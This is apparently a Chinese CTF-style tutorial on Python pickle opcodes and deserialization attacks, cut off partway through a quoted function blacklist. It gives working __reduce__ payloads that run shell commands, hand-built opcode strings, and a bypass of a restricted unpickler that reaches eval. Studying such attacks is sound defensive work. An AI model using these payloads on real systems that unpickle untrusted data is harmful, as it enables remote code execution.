<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\npeople\nq\x00)\x81q\x01&#125;q\x02</span><br><span class="line">(X\x04\x00\x00\x00nameq\x03X\x06\x00\x00\x00\xe5\xbc\xa0\xe4\xb8\x89q\x04X\x07\x00\x00\x00messageq\x05]</span><br><span class="line">q\x06(X\x03\x00\x00\x00\xe7\x94\xb7q\x07X\x05\x00\x00\x0018\xe5\xb2\x81q\x08X\x06\x00\x00\x00\xe5\xad\xa6\xe7\x94\x9fq\teub.&#x27;</span><br><span class="line">    0: \x80 PROTO      3</span><br><span class="line">    2: c    GLOBAL     &#x27;__main__ people&#x27;</span><br><span class="line">   19: q    BINPUT     0</span><br><span class="line">   21: )    EMPTY_TUPLE</span><br><span class="line">   22: \x81 NEWOBJ</span><br><span class="line">   23: q    BINPUT     1</span><br><span class="line">   25: &#125;    EMPTY_DICT</span><br><span class="line">   26: q    BINPUT     2</span><br><span class="line">   28: (    MARK</span><br><span class="line">   29: X        BINUNICODE &#x27;name&#x27;</span><br><span class="line">   38: q        BINPUT     3</span><br><span class="line">   40: X        BINUNICODE &#x27;张三&#x27;</span><br><span class="line">   51: q        BINPUT     4</span><br><span class="line">   53: X        BINUNICODE &#x27;message&#x27;</span><br><span class="line">   65: q        BINPUT     5</span><br><span class="line">   67: ]        EMPTY_LIST</span><br><span class="line">   68: q        BINPUT     6</span><br><span class="line">   70: (        MARK</span><br><span class="line">   71: X            BINUNICODE &#x27;男&#x27;</span><br><span class="line">   79: q            BINPUT     7</span><br><span class="line">   81: X            BINUNICODE &#x27;18岁&#x27;</span><br><span class="line">   91: q            BINPUT     8</span><br><span class="line">   93: X            BINUNICODE &#x27;学生&#x27;</span><br><span class="line">  104: q            BINPUT     9</span><br><span class="line">  106: e            APPENDS    (MARK at 70)</span><br><span class="line">  107: u        SETITEMS   (MARK at 28)</span><br><span class="line">  108: b    BUILD</span><br><span class="line">  109: .    STOP</span><br><span class="line">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>

<p>优化：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">people</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.name = <span class="string">&quot;张三&quot;</span></span><br><span class="line">        self.message = [<span class="string">&#x27;男&#x27;</span>,<span class="string">&#x27;18岁&#x27;</span>,<span class="string">&#x27;学生&#x27;</span>]</span><br><span class="line"></span><br><span class="line">x = people()</span><br><span class="line">s = pickle.dumps(x,protocol=<span class="number">3</span>)</span><br><span class="line">s = pickletools.optimize(s)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">pickletools.dis(s)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\npeople\n)\x81&#125;(X\x04\x00\x00\x00nameX\x06\x00\x00\x00\xe5\xbc\xa0\xe4\xb8\x89X\x07\x00\x00\x00message](X\x03\x00\x00\x00\xe7\x94\xb7X\x05\x00\x00\x0018\xe5\xb2\x81X\x06\x00\x00\x00\xe5\xad\xa6\xe7\x94\x9feub.&#x27;</span><br><span class="line">    0: \x80 PROTO      3</span><br><span class="line">    2: c    GLOBAL     &#x27;__main__ people&#x27;</span><br><span class="line">   19: )    EMPTY_TUPLE</span><br><span class="line">   20: \x81 NEWOBJ</span><br><span class="line">   21: &#125;    EMPTY_DICT</span><br><span class="line">   22: (    MARK</span><br><span class="line">   23: X        BINUNICODE &#x27;name&#x27;</span><br><span class="line">   32: X        BINUNICODE &#x27;张三&#x27;</span><br><span class="line">   43: X        BINUNICODE &#x27;message&#x27;</span><br><span class="line">   55: ]        EMPTY_LIST</span><br><span class="line">   56: (        MARK</span><br><span class="line">   57: X            BINUNICODE &#x27;男&#x27;</span><br><span class="line">   65: X            BINUNICODE &#x27;18岁&#x27;</span><br><span class="line">   75: X            BINUNICODE &#x27;学生&#x27;</span><br><span class="line">   86: e            APPENDS    (MARK at 56)</span><br><span class="line">   87: u        SETITEMS   (MARK at 22)</span><br><span class="line">   88: b    BUILD</span><br><span class="line">   89: .    STOP</span><br><span class="line">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>

<p>可以看到，字符串<code>s</code>比以前短了很多，而且反汇编结果中，<code>BINPUT</code>指令没有了。所谓“优化”，其实就是把不必要的<code>PUT</code>指令给删除掉。这个<code>PUT</code>意思是把当前栈的栈顶复制一份，放进储存区——很明显，我们这个 class 并不需要这个操作，可以省略掉这些<code>PUT</code>指令。利用 pickletools ，我们能很方便地看清楚每条语句的作用、检验我们手动构造出的字符串是否合法等</p>
<h2 id="快速寻找-pickle-源码位置"><a href="#快速寻找-pickle-源码位置" class="headerlink" title="快速寻找 pickle 源码位置"></a>快速寻找 pickle 源码位置</h2><p>在终端的 python 交互式环境中执行：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="built_in">print</span>(pickle.__file__)</span><br></pre></td></tr></table></figure>

<h2 id="pickle-指令"><a href="#pickle-指令" class="headerlink" title="pickle 指令"></a>pickle 指令</h2><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>pickle由于有不同的实现版本，在 python3 和 python2 中得到的 opcode 不相同。但是 pickle 可以向下兼容（所以用 v0 就可以在所有版本中执行）。目前，pickle 有 6 种版本。在pickle.loads时，可以用Protocol参数指定协议版本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">a=&#123;<span class="string">&#x27;1&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;2&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;# 原变量：<span class="subst">&#123;a!r&#125;</span>&#x27;</span>) </span><br><span class="line"><span class="comment">#在Python中，&#123;a!r&#125; 这样的语法表示对变量a使用!r格式化选项进行格式化输出。在这种情况下!r表示使用repr()函数来获取变量a的表示形式，这样可以获得变量a的原始形式，包括引号和转义字符。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;pickle版本<span class="subst">&#123;i&#125;</span>&#x27;</span>,pickle.dumps(a,protocol=i))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 原变量：&#123;&#x27;1&#x27;: 1, &#x27;2&#x27;: 2&#125;</span><br><span class="line">pickle版本0 b&#x27;(dp0\nV1\np1\nI1\nsV2\np2\nI2\ns.&#x27;</span><br><span class="line">pickle版本1 b&#x27;&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span><br><span class="line">pickle版本2 b&#x27;\x80\x02&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span><br><span class="line">pickle版本3 b&#x27;\x80\x03&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span><br></pre></td></tr></table></figure>

<p>目前这些协议有 0,2,3,4 号版本，默认为 3 号版本。这所有版本中，0 号版本是人类最可读的；之后的版本加入了一大堆不可打印字符，不过这些新加的东西都只是为了优化，本质上没有太大的改动。<strong>pickle 协议是向前兼容的</strong>。0 号版本的字符串可以直接交给 <code>pickle.loads()</code> ，不用担心引发什么意外。刚刚说过，字符串中包含了很多条指令。这些指令一定以<strong>一个字节</strong>的指令码（<code>opcode</code>）开头；接下来读取多少内容，由指令码来决定（严格规定了读取几个参数、参数的结束标志符等）。<strong>指令编码是紧凑的</strong>，一条指令结束之后立刻就是下一条指令。</p>
<h3 id="种类"><a href="#种类" class="headerlink" title="种类"></a>种类</h3><p>常用的指令如下：</p>
<table>
<thead>
<tr>
<th align="center">opcode</th>
<th align="center">描述</th>
<th align="center">具体写法</th>
<th align="center">栈上的变化</th>
<th align="center">memo上的变化</th>
</tr>
</thead>
<tbody><tr>
<td align="center">c</td>
<td align="center">获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td>
<td align="center">c[module]\n[instance]\n</td>
<td align="center">获得的对象入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">o</td>
<td align="center">寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
<td align="center">o</td>
<td align="center">这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">i</td>
<td align="center">相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
<td align="center">i[module]\n[callable]\n</td>
<td align="center">这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">N</td>
<td align="center">实例化一个None</td>
<td align="center">N</td>
<td align="center">获得的对象入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">S</td>
<td align="center">实例化一个字符串对象</td>
<td align="center">S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td>
<td align="center">获得的对象入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">V</td>
<td align="center">实例化一个UNICODE字符串对象</td>
<td align="center">Vxxx\n</td>
<td align="center">获得的对象入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">I</td>
<td align="center">实例化一个int对象</td>
<td align="center">Ixxx\n</td>
<td align="center">获得的对象入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">F</td>
<td align="center">实例化一个float对象</td>
<td align="center">Fx.x\n</td>
<td align="center">获得的对象入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">R</td>
<td align="center">选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
<td align="center">R</td>
<td align="center">函数和参数出栈，函数的返回值入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">.</td>
<td align="center">程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
<td align="center">.</td>
<td align="center">无</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">(</td>
<td align="center">向栈中压入一个MARK标记</td>
<td align="center">(</td>
<td align="center">MARK标记入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">t</td>
<td align="center">寻找栈中的上一个MARK，并组合之间的数据为元组</td>
<td align="center">t</td>
<td align="center">MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">)</td>
<td align="center">向栈中直接压入一个空元组</td>
<td align="center">)</td>
<td align="center">空元组入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">l</td>
<td align="center">寻找栈中的上一个MARK，并组合之间的数据为列表</td>
<td align="center">l</td>
<td align="center">MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">]</td>
<td align="center">向栈中直接压入一个空列表</td>
<td align="center">]</td>
<td align="center">空列表入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">d</td>
<td align="center">寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
<td align="center">d</td>
<td align="center">MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">}</td>
<td align="center">向栈中直接压入一个空字典</td>
<td align="center">}</td>
<td align="center">空字典入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">p</td>
<td align="center">将栈顶对象储存至memo_n</td>
<td align="center">pn\n</td>
<td align="center">无</td>
<td align="center">对象被储存</td>
</tr>
<tr>
<td align="center">g</td>
<td align="center">将memo_n的对象压栈</td>
<td align="center">gn\n</td>
<td align="center">对象被压栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">0</td>
<td align="center">丢弃栈顶对象</td>
<td align="center">0</td>
<td align="center">栈顶对象被丢弃</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">b</td>
<td align="center">使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
<td align="center">b</td>
<td align="center">栈上第一个元素出栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">s</td>
<td align="center">将栈的第一个和第二个对象作为 key-value 对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
<td align="center">s</td>
<td align="center">第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">u</td>
<td align="center">寻找栈中的上一个 MARK，组合之间的数据（数据必须有偶数个，即呈 key-value 对）并全部添加或更新到该 MARK 之前的一个元素（必须为字典）中</td>
<td align="center">u</td>
<td align="center">MARK标记以及被组合的数据出栈，字典被更新</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">a</td>
<td align="center">将栈的第一个元素append到第二个元素(列表)中</td>
<td align="center">a</td>
<td align="center">栈顶元素出栈，第二个元素（列表）被更新</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">e</td>
<td align="center">寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
<td align="center">e</td>
<td align="center">MARK标记以及被组合的数据出栈，列表被更新</td>
<td align="center">无</td>
</tr>
</tbody></table>
<p>此外， <code>TRUE</code> 可以用 <code>I</code> 表示： <code>b&#39;I01\n&#39;</code> ； <code>FALSE</code> 也可以用 <code>I</code> 表示： <code>b&#39;I00\n&#39;</code> ，其他opcode可以在<a href="https://github.com/python/cpython/blob/master/Lib/pickle.py#L111">pickle库的源代码</a>中找到。</p>
<p>由这些 opcode 我们可以得到一些需要注意的地方：</p>
<ul>
<li>编写 opcode 时要想象栈中的数据，以正确使用每种 opcode。</li>
<li>在理解时注意与 python 本身的操作对照（比如 python 列表的<code>append</code>对应<code>a</code>、<code>extend</code>对应<code>e</code>；字典的<code>update</code>对应<code>u</code>）。</li>
<li><code>c</code>操作符会尝试<code>import</code>库，所以在<code>pickle.loads</code>时不需要漏洞代码中先引入系统库。</li>
<li>pickle 不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。pickle 能够索引查值的操作只有<code>c</code>、<code>i</code>。而如何查值也是CTF的一个重要考点。</li>
<li><code>s</code>、<code>u</code>、<code>b</code>操作符可以构造并赋值原来没有的属性、键值对。</li>
</ul>
<h2 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h2><h3 id="借助-reduce-命令执行"><a href="#借助-reduce-命令执行" class="headerlink" title="借助__reduce__命令执行"></a>借助<code>__reduce__</code>命令执行</h3><p>举个简单的例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        a=<span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,)) <span class="comment">#a后面的逗号不能省略，因为参数不一定是一个</span></span><br><span class="line">    </span><br><span class="line">a=A()</span><br><span class="line">test=pickle.dumps(a)</span><br><span class="line">pickle.loads(test)</span><br><span class="line"><span class="comment">#会执行os.system(&#x27;whoami&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>利用 <code>__reduce__</code> 构造恶意字符串，当这个字符串被反序列化的时候，<code>__reduce__</code>会被执行。</p>
<p>另一种写法是在内部导入 os 模块：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        a=<span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(a)&quot;</span>,))</span><br><span class="line">    </span><br><span class="line">a=A()</span><br><span class="line">test=pickle.dumps(a)</span><br><span class="line">pickle.loads(test)</span><br><span class="line"><span class="comment"># 会执行os.system(&#x27;whoami&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>好处是代码没导入 os 模块的话也能执行。</p>
<p>本方法的解题思路：</p>
<ol>
<li>找 pickle 反序列化位点</li>
<li>本地重写 reduce 方法，生成序列化字符串</li>
<li>触发反序列化</li>
</ol>
<h3 id="手写-pickle-代码"><a href="#手写-pickle-代码" class="headerlink" title="手写 pickle 代码"></a>手写 pickle 代码</h3><p>先从一个例子熟悉一下一般的 pickle 代码的组成：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle, pickletools, os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="string">r&quot;&quot;&quot;ls -la&quot;&quot;&quot;</span> </span><br><span class="line">        <span class="comment"># &quot;&quot;&quot; 用来表示多行字符串</span></span><br><span class="line">        <span class="comment"># r&quot;&quot;&quot;ls -la&quot;&quot;&quot; 是一个原始字符串字面量，它表示包含文本 ls -la 的字符串。在 python 中，使用 r 前缀可以创建原始字符串，这意味着反斜杠字符 \ 将被视为普通字符，而不会被解释为转义字符。</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(exp(),protocol=<span class="number">0</span>)</span><br><span class="line">pickletools.dis(a)</span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    0: c    GLOBAL     &#x27;nt system&#x27; # 向栈顶压入 nt.system 这个可执行对象</span><br><span class="line">   11: p    PUT        0 # 将这个对象存储到内存区的第0个位置</span><br><span class="line">   14: (    MARK # 压入一个元组的开始标志 </span><br><span class="line">   15: V        UNICODE    &#x27;ls -la&#x27; # 压入一个字符串</span><br><span class="line">   23: p        PUT        1 # 将这个字符串存储到内存区的第1个位置</span><br><span class="line">   26: t        TUPLE      (MARK at 14) # 将由刚压入栈中的元素弹出，再将由这个元素组成的元组压入栈中</span><br><span class="line">   27: p    PUT        2 # 将这个元组存储到内存区的第2个位置</span><br><span class="line">   30: R    REDUCE # 从栈上弹出两个元素，分别是可执行对象和元组，并执行，结果压入栈中</span><br><span class="line">   31: p    PUT        3 # 将栈顶的元素（也就是刚才执行的结果）存储到内存区的第3个位置</span><br><span class="line">   34: .    STOP # 结束整个程序</span><br><span class="line">highest protocol among opcodes = 0</span><br></pre></td></tr></table></figure>

<p>注意：第一行的 nt 表示 windows 系统，posix 表示 Linux 系统，双端不互通。</p>
<p>显然，这里的内存区是没有起到任何作用的。所以我们可以将这段代码进一步简化，去除存储内存区的过程：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle, builtins <span class="comment"># 这里建议导入builtins，否则在一些情况下会出现问题</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;&quot;cnt</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(Vls -la</span></span><br><span class="line"><span class="string">tR.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">pickle.loads(payload)</span><br></pre></td></tr></table></figure>

<p>使用 <code>b</code> 前缀表示数据是以字节为单位的字节字符串（bytes），而不是 Unicode 字符。字节字符串是以字节为单位的不可变序列。</p>
<p>发现可以运行并输出结果，很好。接着我们尝试编写绕过的代码。下面的注释中详细描述了整个过程，<code>metastack</code>和<code>stack</code>是<code>_unframer</code>中的两个不同的list（调试过程中）。其中每个OPCODE的操作我都用分号隔开了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cbuiltins <span class="comment">#设置builtins为可执行对象</span></span><br><span class="line"><span class="built_in">getattr</span> <span class="comment">#获取builtins.getattr函数，而且被存放在stack中</span></span><br><span class="line">(cbuiltins <span class="comment">#getattr函数从stack中弹出，被圧入metastack；设置builtins为可执行对象</span></span><br><span class="line"><span class="built_in">dict</span> <span class="comment">#获取builtins.dict对象（因为globals是字典类型的），得到的dict类型被存放在stack中</span></span><br><span class="line">S<span class="string">&#x27;get&#x27;</span> <span class="comment">#将&quot;get&quot;字符串压入stack中</span></span><br><span class="line">tR(cbuiltins <span class="comment">###弹出metastack中的getattr函数，圧入stack中，然后使顶层的builtins.dict,&#x27;get&#x27;组成元组，</span></span><br><span class="line">   <span class="comment">###再将这整个结果圧入栈中（这时getattr函数和新组成的元组均被存放在stack中，而metastack为空）；</span></span><br><span class="line">   <span class="comment">###随后执行builtins.getattr(builtins.dict,&#x27;get&#x27;)，使得metastack为空，而stack中是结果，也就是对dict类型的get方法；</span></span><br><span class="line">   <span class="comment">###之后get方法从stack弹出并圧入metastack；最后设置builtins为可执行对象</span></span><br><span class="line"><span class="built_in">globals</span> <span class="comment">#获取builtins.globals，被存放在stack中（这时metastack为get方法而stack中是builtins.globals）</span></span><br><span class="line">(tRS<span class="string">&#x27;builtins&#x27;</span> <span class="comment">###将builtins.globals从stack中弹出并圧入metastack，这时metastack含有get方法和globals函数，而stack为空；</span></span><br><span class="line">   <span class="comment">###从metastack中弹出globals函数至stack，生成了一个空元组并被圧入stack；命令执行globals()，且将结果圧入stack；</span></span><br><span class="line">   <span class="comment">###随后&quot;builtins&quot;字符串被圧入stack栈中</span></span><br><span class="line">tRp1 <span class="comment">###从metastack中弹出get函数至stack中（这时metastack已经空了），原先在stack顶层的&quot;builtins&quot;字符串和globals()的结果组成一个新元组；</span></span><br><span class="line">   <span class="comment">###命令执行dict.get(globals(),&quot;builtins&quot;)，生成的结果圧入stack中；将stack顶部的内容存到memo的里，编号为1</span></span><br><span class="line">. <span class="comment">#结束的标志</span></span><br></pre></td></tr></table></figure>

<p>以上所有内容相当于这样的一句Python命令：<code>import builtins;dict.get(globals(),&quot;builtins&quot;)</code>，也就是取得了<code>builtins</code>对象。在此基础上，我们继续去获取<code>eval</code>函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cbuiltins</span><br><span class="line"><span class="built_in">getattr</span></span><br><span class="line">(cbuiltins</span><br><span class="line"><span class="built_in">dict</span></span><br><span class="line">S<span class="string">&#x27;get&#x27;</span></span><br><span class="line">tR(cbuiltins</span><br><span class="line"><span class="built_in">globals</span></span><br><span class="line">(tRS<span class="string">&#x27;builtins&#x27;</span></span><br><span class="line">tRp1 <span class="comment"># memo1为builtins对象</span></span><br><span class="line">cbuiltins</span><br><span class="line"><span class="built_in">getattr</span></span><br><span class="line">(g1 <span class="comment">#获取builtins对象</span></span><br><span class="line">S<span class="string">&#x27;eval&#x27;</span></span><br><span class="line">tR(S<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls -la&quot;)&#x27;</span> <span class="comment">#等同于builtins.getattr(builtins,&quot;eval&quot;)并将这个可调用的eval对象压入栈中</span></span><br><span class="line">tR. <span class="comment">#等同于eval(&quot;__import__(&#x27;os).system(&#x27;ls&#x27;)&quot;)并结束程序的运行</span></span><br></pre></td></tr></table></figure>

<p>由于之前仔细描述了类似的内容，这部分就不多赘述了，针对此题后半部分的exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">__all__ = (<span class="string">&#x27;PickleSerializer&#x27;</span>, )</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    blacklist = &#123;<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line">        </span><br><span class="line">payload = <span class="string">b&quot;&quot;&quot;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;builtins&#x27;</span></span><br><span class="line"><span class="string">tRp1</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(g1</span></span><br><span class="line"><span class="string">S&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;ls -la&quot;)&#x27;</span></span><br><span class="line"><span class="string">tR.&quot;&quot;&quot;</span></span><br><span class="line">RestrictedUnpickler(io.BytesIO(payload)).load()</span><br></pre></td></tr></table></figure>

<p>如果遇到需要不同pickle代码的情形，还可以参考<a href="https://github.com/sensepost/anapickle/blob/master/anapickle.py">这个项目</a>或者干脆使用<a href="https://github.com/eddieivan01/pker">这个工具pker</a>；提一句，使用pker生成和以上效果一致的payload是这样写的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getattr</span>=GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>)</span><br><span class="line"><span class="built_in">dict</span>=GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;dict&#x27;</span>)</span><br><span class="line">dict_get=<span class="built_in">getattr</span>(<span class="built_in">dict</span>,<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">glo_dic=GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>)()</span><br><span class="line">builtins=dict_get(glo_dic,<span class="string">&#x27;builtins&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span>=<span class="built_in">getattr</span>(builtins,<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;ls -la&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<h4 id="拼接-opcode"><a href="#拼接-opcode" class="headerlink" title="拼接 opcode"></a>拼接 opcode</h4><p>将第一个 pickle 流结尾表示结束的 <code>.</code> 去掉，将第二个 pickle 流与第一个拼接起来即可。</p>
<h2 id="过滤与绕过"><a href="#过滤与绕过" class="headerlink" title="过滤与绕过"></a>过滤与绕过</h2><h3 id="黑名单过滤"><a href="#黑名单过滤" class="headerlink" title="黑名单过滤"></a>黑名单过滤</h3><p>有一种过滤方式：不禁止<code>R</code>指令码，但是对<code>R</code>执行的函数有黑名单限制。典型的例子是2018-XCTF-HITB-WEB : Python’s-Revenge。给了好长好长一串黑名单：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">black_type_list = [<span class="built_in">eval</span>, execfile, <span class="built_in">compile</span>, <span class="built_in">open</span>, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.<span class="built_in">open</span>, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, 